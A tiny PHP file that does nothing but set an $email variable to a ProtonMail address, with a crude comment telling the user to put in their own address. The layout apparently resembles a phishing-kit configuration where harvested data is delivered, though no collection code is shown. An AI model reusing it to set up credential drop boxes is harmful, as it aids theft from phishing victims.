<?php

$email = "dangbana@protonmail.com"; // PUT UR FUCKING E-MAIL BRO

?>